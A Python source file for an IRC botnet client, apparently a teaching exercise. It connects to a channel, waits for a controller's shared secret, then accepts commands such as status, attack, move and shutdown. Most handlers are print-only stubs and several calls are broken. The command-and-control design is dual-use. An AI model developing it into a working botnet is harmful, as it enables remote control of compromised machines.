import socketserver
import socket, threading
import sys
from collections import deque
import time
import string
import random
import select

def sendPrivMSG(target,message):
    client.send(('PRIVMSG ' + target + ' :'+message +'\n').encode('utf-8'))

def do_status(client, args, id):
    global controller
    sendPrivMSG(controller,'bot'+id)

def do_attack(client, args):
    print("attack", args[1], args[2])

def do_move(client, args):
    print("bots connect to the new IRC server")

def do_quit(client, args):
    client.close()

def do_shutdown(client, args):
    print("shutdown the bots")



# Structure so that the program can look into to decide which method to call based on user specified argument
interpretInput = {
    'status':do_status,
    'attack':do_attack,
    'move':do_move,
    'quit':do_quit,
    'shutdown':do_shutdown
}

authorized = False
controller = ''

if __name__ == "__main__":
    # getting the arguments when server is running with no options
    HOST = sys.argv[1]
    srcPort = int(sys.argv[2])
    channel = sys.argv[3][1:]
    secret = sys.argv[4]
    
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.connect((HOST,srcPort))
        while True:
            id = ''.join(random.SystemRandom().choice(string.ascii_uppercase + string.digits) for _ in range(6))
            print(id)
            client.send(('NICK bot'+id+'\n').encode('utf-8'))
            try:
                print('in try')
                client.settimeout(4)
                data = client.recv(128).decode('utf-8')
                print ('IRC said:', data)
                if not data == 'ERR_NICKNAMEINUSE':
                    break
            except socket.timeout:
                break

        client.settimeout(None)
        client.send(('USER bot * * :Bot BotMacBotFace\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')
        print('response: ',data)
        if not '001' in data:
            print('You are not welcome')
            continue
        
        client.send(('JOIN '+channel+'\n').encode('utf-8'))
        data = client.recv(1024).decode('utf-8')
        print('response: ', data)

        print('going to while')
        while True:
            data = client.recv(1024).decode('utf-8')
            print("A message from server:", data)
            messages = data.split(':')
            
            if len(messages) < 3:
                continue
            else:
                message = messages[2].strip()
            
            controller = messages[1].split('!')[0].strip()
            if not authorized:
                print('message and secret: ',message,secret)
                if message == secret:
                    print("Authorized controler accessig ...")
                    authorized = True
                else:
                    print("Not authorized to control me ...")
                    break
            else:
                print("receive commands to do things")
                args = message.split()
                if not args[0] in interpretInput:
                    print('No such command\n')
                else:
                    interpretInput[args[0]](client,args,id)

